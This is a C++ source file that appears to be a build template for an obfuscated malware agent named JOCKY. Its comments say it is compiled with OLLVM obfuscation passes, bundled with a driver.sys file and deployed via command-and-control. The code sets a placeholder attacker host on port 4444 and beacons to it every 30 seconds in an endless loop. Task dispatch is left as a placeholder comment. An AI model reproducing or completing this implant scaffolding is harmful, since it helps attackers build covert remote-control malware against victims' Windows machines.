// agent_template.cpp — JOCKY obfuscated agent build template
// Compiled via jocky build server with OLLVM passes (fla, sub, bcf, etc.)
// The compiled artifact is bundled with driver.sys and deployed via C2.
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

volatile char g_c2Host[64]    = "ATTACKER_IP_HERE";
volatile USHORT g_c2Port      = 4444;
volatile DWORD g_pollInterval = 30000;

static void beacon_init() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
}

static SOCKET beacon_connect() {
    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(g_c2Port);
    addr.sin_addr.s_addr = inet_addr((const char*)g_c2Host);

    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    return s;
}

static void agent_loop() {
    beacon_init();
    while (true) {
        SOCKET s = beacon_connect();
        if (s != INVALID_SOCKET) {
            // placeholder: task dispatch
            closesocket(s);
        }
        Sleep(g_pollInterval);
    }
}

int main() {
    agent_loop();
    return 0;
}
